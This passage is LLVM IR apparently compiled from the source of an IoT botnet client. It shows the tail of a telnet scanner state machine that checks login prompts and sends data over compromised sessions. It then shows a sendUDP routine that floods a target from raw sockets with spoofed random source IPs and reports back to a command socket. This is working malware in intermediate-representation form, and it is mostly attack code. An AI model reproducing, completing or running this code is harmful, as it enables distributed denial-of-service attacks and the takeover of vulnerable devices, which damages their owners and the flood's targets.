  %1709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1708, i32 0, i32 7
  store i16 0, i16* %1709, align 16
  %1710 = load i32, i32* %2, align 4
  %1711 = sext i32 %1710 to i64
  %1712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1711
  %1713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1712, i32 0, i32 8
  %1714 = load i8*, i8** %1713, align 8
  %1715 = call i8* @strstr(i8* %1714, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %1716 = icmp ne i8* %1715, null
  br i1 %1716, label %1717, label %1737

; <label>:1717:                                   ; preds = %1701
  %1718 = load i32, i32* %2, align 4
  %1719 = sext i32 %1718 to i64
  %1720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1719
  %1721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1720, i32 0, i32 8
  %1722 = load i8*, i8** %1721, align 8
  call void @llvm.memset.p0i8.i64(i8* %1722, i8 0, i64 1024, i32 1, i1 false)
  %1723 = load i32, i32* %2, align 4
  %1724 = sext i32 %1723 to i64
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1724
  %1726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1725, i32 0, i32 0
  %1727 = load i32, i32* %1726, align 16
  %1728 = call i32 @sclose(i32 %1727)
  %1729 = load i32, i32* %2, align 4
  %1730 = sext i32 %1729 to i64
  %1731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1730
  %1732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1731, i32 0, i32 2
  store i8 0, i8* %1732, align 8
  %1733 = load i32, i32* %2, align 4
  %1734 = sext i32 %1733 to i64
  %1735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1734
  %1736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1735, i32 0, i32 3
  store i8 0, i8* %1736, align 1
  br label %1943

; <label>:1737:                                   ; preds = %1701
  %1738 = load i32, i32* %2, align 4
  %1739 = sext i32 %1738 to i64
  %1740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1739
  %1741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1740, i32 0, i32 8
  %1742 = load i8*, i8** %1741, align 8
  %1743 = call i32 @matchPrompt(i8* %1742)
  %1744 = icmp ne i32 %1743, 0
  br i1 %1744, label %1765, label %1745

; <label>:1745:                                   ; preds = %1737
  %1746 = load i32, i32* %2, align 4
  %1747 = sext i32 %1746 to i64
  %1748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1747
  %1749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1748, i32 0, i32 8
  %1750 = load i8*, i8** %1749, align 8
  call void @llvm.memset.p0i8.i64(i8* %1750, i8 0, i64 1024, i32 1, i1 false)
  %1751 = load i32, i32* %2, align 4
  %1752 = sext i32 %1751 to i64
  %1753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1752
  %1754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1753, i32 0, i32 0
  %1755 = load i32, i32* %1754, align 16
  %1756 = call i32 @sclose(i32 %1755)
  %1757 = load i32, i32* %2, align 4
  %1758 = sext i32 %1757 to i64
  %1759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1758
  %1760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1759, i32 0, i32 2
  store i8 0, i8* %1760, align 8
  %1761 = load i32, i32* %2, align 4
  %1762 = sext i32 %1761 to i64
  %1763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1762
  %1764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1763, i32 0, i32 3
  store i8 1, i8* %1764, align 1
  br label %1943

; <label>:1765:                                   ; preds = %1737
  %1766 = load i32, i32* %2, align 4
  %1767 = sext i32 %1766 to i64
  %1768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1767
  %1769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1768, i32 0, i32 2
  store i8 7, i8* %1769, align 8
  br label %1770

; <label>:1770:                                   ; preds = %1765
  %1771 = load i32, i32* %2, align 4
  %1772 = sext i32 %1771 to i64
  %1773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1772
  %1774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1773, i32 0, i32 8
  %1775 = load i8*, i8** %1774, align 8
  call void @llvm.memset.p0i8.i64(i8* %1775, i8 0, i64 1024, i32 1, i1 false)
  br label %1943

; <label>:1776:                                   ; preds = %1682
  %1777 = load i32, i32* %2, align 4
  %1778 = sext i32 %1777 to i64
  %1779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1778
  %1780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1779, i32 0, i32 8
  %1781 = load i8*, i8** %1780, align 8
  %1782 = call i64 @strlen(i8* %1781) #10
  %1783 = trunc i64 %1782 to i16
  %1784 = load i32, i32* %2, align 4
  %1785 = sext i32 %1784 to i64
  %1786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1785
  %1787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1786, i32 0, i32 7
  store i16 %1783, i16* %1787, align 16
  br label %1788

; <label>:1788:                                   ; preds = %1776
  br label %1789

; <label>:1789:                                   ; preds = %1788
  br label %1790

; <label>:1790:                                   ; preds = %1789
  br label %1791

; <label>:1791:                                   ; preds = %1790
  br label %1792

; <label>:1792:                                   ; preds = %1791
  br label %1793

; <label>:1793:                                   ; preds = %1792
  br label %1794

; <label>:1794:                                   ; preds = %1793
  br label %1795

; <label>:1795:                                   ; preds = %1794
  %1796 = load i32, i32* %2, align 4
  %1797 = sext i32 %1796 to i64
  %1798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1797
  %1799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1798, i32 0, i32 6
  %1800 = load i32, i32* %1799, align 4
  %1801 = add i32 %1800, 10
  %1802 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1803 = icmp ult i32 %1801, %1802
  br i1 %1803, label %1804, label %1819

; <label>:1804:                                   ; preds = %1795
  %1805 = load i32, i32* %2, align 4
  %1806 = sext i32 %1805 to i64
  %1807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1806
  %1808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1807, i32 0, i32 0
  %1809 = load i32, i32* %1808, align 16
  %1810 = call i32 @sclose(i32 %1809)
  %1811 = load i32, i32* %2, align 4
  %1812 = sext i32 %1811 to i64
  %1813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1812
  %1814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1813, i32 0, i32 2
  store i8 0, i8* %1814, align 8
  %1815 = load i32, i32* %2, align 4
  %1816 = sext i32 %1815 to i64
  %1817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1816
  %1818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1817, i32 0, i32 3
  store i8 1, i8* %1818, align 1
  br label %1819

; <label>:1819:                                   ; preds = %1804, %1795
  br label %1942

; <label>:1820:                                   ; preds = %68
  %1821 = load i32, i32* %2, align 4
  %1822 = sext i32 %1821 to i64
  %1823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1822
  %1824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1823, i32 0, i32 0
  %1825 = load i32, i32* %1824, align 16
  %1826 = call i64 @send(i32 %1825, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0), i64 4, i32 16384)
  %1827 = icmp slt i64 %1826, 0
  br i1 %1827, label %1828, label %1843

; <label>:1828:                                   ; preds = %1820
  %1829 = load i32, i32* %2, align 4
  %1830 = sext i32 %1829 to i64
  %1831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1830
  %1832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1831, i32 0, i32 0
  %1833 = load i32, i32* %1832, align 16
  %1834 = call i32 @sclose(i32 %1833)
  %1835 = load i32, i32* %2, align 4
  %1836 = sext i32 %1835 to i64
  %1837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1836
  %1838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1837, i32 0, i32 2
  store i8 0, i8* %1838, align 8
  %1839 = load i32, i32* %2, align 4
  %1840 = sext i32 %1839 to i64
  %1841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1840
  %1842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1841, i32 0, i32 3
  store i8 1, i8* %1842, align 1
  br label %1943

; <label>:1843:                                   ; preds = %1820
  %1844 = load i32, i32* %2, align 4
  %1845 = sext i32 %1844 to i64
  %1846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1845
  %1847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1846, i32 0, i32 2
  store i8 8, i8* %1847, align 8
  br label %1942

; <label>:1848:                                   ; preds = %68
  %1849 = load i32, i32* %2, align 4
  %1850 = sext i32 %1849 to i64
  %1851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1850
  %1852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1851, i32 0, i32 0
  %1853 = load i32, i32* %1852, align 16
  %1854 = call i64 @send(i32 %1853, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.43, i32 0, i32 0), i64 9, i32 16384)
  %1855 = icmp slt i64 %1854, 0
  br i1 %1855, label %1856, label %1871

; <label>:1856:                                   ; preds = %1848
  %1857 = load i32, i32* %2, align 4
  %1858 = sext i32 %1857 to i64
  %1859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1858
  %1860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1859, i32 0, i32 0
  %1861 = load i32, i32* %1860, align 16
  %1862 = call i32 @sclose(i32 %1861)
  %1863 = load i32, i32* %2, align 4
  %1864 = sext i32 %1863 to i64
  %1865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1864
  %1866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1865, i32 0, i32 2
  store i8 0, i8* %1866, align 8
  %1867 = load i32, i32* %2, align 4
  %1868 = sext i32 %1867 to i64
  %1869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1868
  %1870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1869, i32 0, i32 3
  store i8 1, i8* %1870, align 1
  br label %1943

; <label>:1871:                                   ; preds = %1848
  %1872 = load i32, i32* %2, align 4
  %1873 = sext i32 %1872 to i64
  %1874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1873
  %1875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1874, i32 0, i32 2
  store i8 9, i8* %1875, align 8
  br label %1942

; <label>:1876:                                   ; preds = %68
  %1877 = load i32, i32* %2, align 4
  %1878 = sext i32 %1877 to i64
  %1879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1878
  %1880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1879, i32 0, i32 6
  %1881 = load i32, i32* %1880, align 4
  %1882 = icmp eq i32 %1881, 0
  br i1 %1882, label %1883, label %1889

; <label>:1883:                                   ; preds = %1876
  %1884 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1885 = load i32, i32* %2, align 4
  %1886 = sext i32 %1885 to i64
  %1887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1886
  %1888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1887, i32 0, i32 6
  store i32 %1884, i32* %1888, align 4
  br label %1889

; <label>:1889:                                   ; preds = %1883, %1876
  %1890 = load i32, i32* %2, align 4
  %1891 = sext i32 %1890 to i64
  %1892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1891
  %1893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1892, i32 0, i32 0
  %1894 = load i32, i32* %1893, align 16
  %1895 = call i64 @send(i32 %1894, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.44, i32 0, i32 0), i64 194, i32 16384)
  %1896 = icmp slt i64 %1895, 0
  br i1 %1896, label %1897, label %1917

; <label>:1897:                                   ; preds = %1889
  %1898 = load i32, i32* %2, align 4
  %1899 = sext i32 %1898 to i64
  %1900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1899
  %1901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1900, i32 0, i32 0
  %1902 = load i32, i32* %1901, align 16
  %1903 = call i32 @sclose(i32 %1902)
  %1904 = load i32, i32* %2, align 4
  %1905 = sext i32 %1904 to i64
  %1906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1905
  %1907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1906, i32 0, i32 2
  store i8 0, i8* %1907, align 8
  %1908 = load i32, i32* %2, align 4
  %1909 = sext i32 %1908 to i64
  %1910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1909
  %1911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1910, i32 0, i32 3
  store i8 1, i8* %1911, align 1
  %1912 = load i32, i32* %2, align 4
  %1913 = sext i32 %1912 to i64
  %1914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1913
  %1915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1914, i32 0, i32 8
  %1916 = load i8*, i8** %1915, align 8
  call void @llvm.memset.p0i8.i64(i8* %1916, i8 0, i64 1024, i32 1, i1 false)
  br label %1943

; <label>:1917:                                   ; preds = %1889
  %1918 = load i32, i32* %2, align 4
  %1919 = sext i32 %1918 to i64
  %1920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1919
  %1921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1920, i32 0, i32 6
  %1922 = load i32, i32* %1921, align 4
  %1923 = add i32 %1922, 10
  %1924 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1925 = icmp ult i32 %1923, %1924
  br i1 %1925, label %1926, label %1941

; <label>:1926:                                   ; preds = %1917
  %1927 = load i32, i32* %2, align 4
  %1928 = sext i32 %1927 to i64
  %1929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1928
  %1930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1929, i32 0, i32 0
  %1931 = load i32, i32* %1930, align 16
  %1932 = call i32 @sclose(i32 %1931)
  %1933 = load i32, i32* %2, align 4
  %1934 = sext i32 %1933 to i64
  %1935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1934
  %1936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1935, i32 0, i32 2
  store i8 0, i8* %1936, align 8
  %1937 = load i32, i32* %2, align 4
  %1938 = sext i32 %1937 to i64
  %1939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1938
  %1940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1939, i32 0, i32 3
  store i8 1, i8* %1940, align 1
  br label %1941

; <label>:1941:                                   ; preds = %1926, %1917
  br label %1942

; <label>:1942:                                   ; preds = %1941, %1871, %1843, %1819, %1006, %942, %594, %530, %373, %217, %68
  br label %1943

; <label>:1943:                                   ; preds = %1942, %1897, %1856, %1828, %1770, %1745, %1717, %1676, %1651, %1623, %1582, %1557, %1529, %1488, %1463, %1435, %1394, %1369, %1341, %1300, %1275, %1247, %1206, %1181, %1153, %1112, %1087, %1059, %991, %968, %883, %860, %837, %814, %791, %768, %745, %722, %708, %657, %579, %556, %483, %432, %298, %170, %140
  %1944 = load i32, i32* %2, align 4
  %1945 = add nsw i32 %1944, 1
  store i32 %1945, i32* %2, align 4
  br label %64

; <label>:1946:                                   ; preds = %64
  br label %62
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %269

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %104

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  br label %269

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* %11, align 4
  %61 = add nsw i32 %60, 1
  %62 = sext i32 %61 to i64
  %63 = call noalias i8* @malloc(i64 %62) #2
  store i8* %63, i8** %16, align 8
  %64 = load i8*, i8** %16, align 8
  %65 = icmp eq i8* %64, null
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %59
  br label %269

; <label>:67:                                     ; preds = %59
  %68 = load i8*, i8** %16, align 8
  %69 = load i32, i32* %11, align 4
  %70 = add nsw i32 %69, 1
  %71 = sext i32 %70 to i64
  call void @llvm.memset.p0i8.i64(i8* %68, i8 0, i64 %71, i32 1, i1 false)
  %72 = load i8*, i8** %16, align 8
  %73 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %72, i32 %73)
  %74 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %75 = load i32, i32* %9, align 4
  %76 = add nsw i32 %74, %75
  store i32 %76, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %77

; <label>:77:                                     ; preds = %100, %99, %67
  %78 = load i32, i32* %15, align 4
  %79 = load i8*, i8** %16, align 8
  %80 = load i32, i32* %11, align 4
  %81 = sext i32 %80 to i64
  %82 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %83 = call i64 @sendto(i32 %78, i8* %79, i64 %81, i32 0, %struct.sockaddr* %82, i32 16)
  %84 = load i32, i32* %18, align 4
  %85 = load i32, i32* %14, align 4
  %86 = icmp eq i32 %84, %85
  br i1 %86, label %87, label %100

; <label>:87:                                     ; preds = %77
  %88 = load i32, i32* %8, align 4
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %94

; <label>:90:                                     ; preds = %87
  %91 = call i32 @rand_cmwc()
  %92 = trunc i32 %91 to i16
  %93 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %92, i16* %93, align 2
  br label %94

; <label>:94:                                     ; preds = %90, %87
  %95 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %96 = load i32, i32* %17, align 4
  %97 = icmp sgt i32 %95, %96
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %94
  br label %103

; <label>:99:                                     ; preds = %94
  store i32 0, i32* %18, align 4
  br label %77

; <label>:100:                                    ; preds = %77
  %101 = load i32, i32* %18, align 4
  %102 = add i32 %101, 1
  store i32 %102, i32* %18, align 4
  br label %77

; <label>:103:                                    ; preds = %98
  br label %269

; <label>:104:                                    ; preds = %46
  %105 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %105, i32* %19, align 4
  %106 = load i32, i32* %19, align 4
  %107 = icmp ne i32 %106, 0
  br i1 %107, label %111, label %108

; <label>:108:                                    ; preds = %104
  %109 = load i32, i32* @mainCommSock, align 4
  %110 = call i32 (i32, i8*, ...) @sockprintf(i32 %109, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  br label %269

; <label>:111:                                    ; preds = %104
  store i32 1, i32* %20, align 4
  %112 = load i32, i32* %19, align 4
  %113 = bitcast i32* %20 to i8*
  %114 = call i32 @setsockopt(i32 %112, i32 0, i32 3, i8* %113, i32 4) #2
  %115 = icmp slt i32 %114, 0
  br i1 %115, label %116, label %119

; <label>:116:                                    ; preds = %111
  %117 = load i32, i32* @mainCommSock, align 4
  %118 = call i32 (i32, i8*, ...) @sockprintf(i32 %117, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i32 0, i32 0))
  br label %269

; <label>:119:                                    ; preds = %111
  store i32 50, i32* %21, align 4
  br label %120

; <label>:120:                                    ; preds = %124, %119
  %121 = load i32, i32* %21, align 4
  %122 = add nsw i32 %121, -1
  store i32 %122, i32* %21, align 4
  %123 = icmp ne i32 %121, 0
  br i1 %123, label %124, label %129

; <label>:124:                                    ; preds = %120
  %125 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %126 = call i32 @rand_cmwc()
  %127 = xor i32 %125, %126
  call void @srand(i32 %127) #2
  %128 = call i32 @rand() #2
  call void @init_rand(i32 %128)
  br label %120

; <label>:129:                                    ; preds = %120
  %130 = load i32, i32* %10, align 4
  %131 = icmp eq i32 %130, 0
  br i1 %131, label %132, label %133

; <label>:132:                                    ; preds = %129
  store i32 0, i32* %22, align 4
  br label %139

; <label>:133:                                    ; preds = %129
  %134 = load i32, i32* %10, align 4
  %135 = sub nsw i32 32, %134
  %136 = shl i32 1, %135
  %137 = sub nsw i32 %136, 1
  %138 = xor i32 %137, -1
  store i32 %138, i32* %22, align 4
  br label %139

; <label>:139:                                    ; preds = %133, %132
  %140 = load i32, i32* %11, align 4
  %141 = sext i32 %140 to i64
  %142 = add i64 28, %141
  %143 = call i8* @llvm.stacksave()
  store i8* %143, i8** %23, align 8
  %144 = alloca i8, i64 %142, align 16
  %145 = bitcast i8* %144 to %struct.iphdr*
  store %struct.iphdr* %145, %struct.iphdr** %24, align 8
  %146 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = getelementptr i8, i8* %147, i64 20
  %149 = bitcast i8* %148 to %struct.udphdr*
  store %struct.udphdr* %149, %struct.udphdr** %25, align 8
  %150 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %152 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %151, i32 0, i32 0
  %153 = load i32, i32* %152, align 4
  %154 = load i32, i32* %22, align 4
  %155 = call i32 @getRandomIP(i32 %154)
  %156 = call i32 @htonl(i32 %155) #13
  %157 = load i32, i32* %11, align 4
  %158 = sext i32 %157 to i64
  %159 = add i64 8, %158
  %160 = trunc i64 %159 to i32
  call void @makeIPPacket(%struct.iphdr* %150, i32 %153, i32 %156, i8 zeroext 17, i32 %160)
  %161 = load i32, i32* %11, align 4
  %162 = sext i32 %161 to i64
  %163 = add i64 8, %162
  %164 = trunc i64 %163 to i16
  %165 = call zeroext i16 @htons(i16 zeroext %164) #13
  %166 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %167 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.3* %167 to %struct.anon.4*
  %169 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %168, i32 0, i32 2
  store i16 %165, i16* %169, align 2
  %170 = call i32 @rand_cmwc()
  %171 = trunc i32 %170 to i16
  %172 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i32 0, i32 0
  %174 = bitcast %union.anon.3* %173 to %struct.anon.4*
  %175 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %174, i32 0, i32 0
  store i16 %171, i16* %175, align 2
  %176 = load i32, i32* %8, align 4
  %177 = icmp eq i32 %176, 0
  br i1 %177, label %178, label %180

; <label>:178:                                    ; preds = %139
  %179 = call i32 @rand_cmwc()
  br label %185

; <label>:180:                                    ; preds = %139
  %181 = load i32, i32* %8, align 4
  %182 = trunc i32 %181 to i16
  %183 = call zeroext i16 @htons(i16 zeroext %182) #13
  %184 = zext i16 %183 to i32
  br label %185

; <label>:185:                                    ; preds = %180, %178
  %186 = phi i32 [ %179, %178 ], [ %184, %180 ]
  %187 = trunc i32 %186 to i16
  %188 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 0
  %190 = bitcast %union.anon.3* %189 to %struct.anon.4*
  %191 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %190, i32 0, i32 1
  store i16 %187, i16* %191, align 2
  %192 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %193 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %192, i32 0, i32 0
  %194 = bitcast %union.anon.3* %193 to %struct.anon.4*
  %195 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %194, i32 0, i32 3
  store i16 0, i16* %195, align 2
  %196 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %197 = bitcast %struct.udphdr* %196 to i8*
  %198 = getelementptr inbounds i8, i8* %197, i64 8
  %199 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %198, i32 %199)
  %200 = bitcast i8* %144 to i16*
  %201 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 2
  %203 = load i16, i16* %202, align 2
  %204 = zext i16 %203 to i32
  %205 = call zeroext i16 @csum(i16* %200, i32 %204)
  %206 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 7
  store i16 %205, i16* %207, align 2
  %208 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %209 = load i32, i32* %9, align 4
  %210 = add nsw i32 %208, %209
  store i32 %210, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %211

; <label>:211:                                    ; preds = %264, %263, %185
  br label %212

; <label>:212:                                    ; preds = %211
  %213 = load i32, i32* %19, align 4
  %214 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %215 = call i64 @sendto(i32 %213, i8* %144, i64 %142, i32 0, %struct.sockaddr* %214, i32 16)
  %216 = call i32 @rand_cmwc()
  %217 = trunc i32 %216 to i16
  %218 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %219 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %218, i32 0, i32 0
  %220 = bitcast %union.anon.3* %219 to %struct.anon.4*
  %221 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %220, i32 0, i32 0
  store i16 %217, i16* %221, align 2
  %222 = load i32, i32* %8, align 4
  %223 = icmp eq i32 %222, 0
